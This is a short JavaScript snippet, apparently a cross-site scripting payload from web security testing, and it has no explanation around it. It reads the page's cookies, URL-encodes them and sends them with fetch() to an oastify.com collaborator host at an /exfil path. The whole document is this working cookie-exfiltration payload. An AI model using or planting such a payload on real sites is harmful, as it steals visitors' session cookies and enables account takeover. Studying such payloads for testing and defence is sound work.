let cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("https://536qd0bplf13wjesley2gzbkjbp2dy1n.oastify.com/exfil?data=" + encodedCookie)
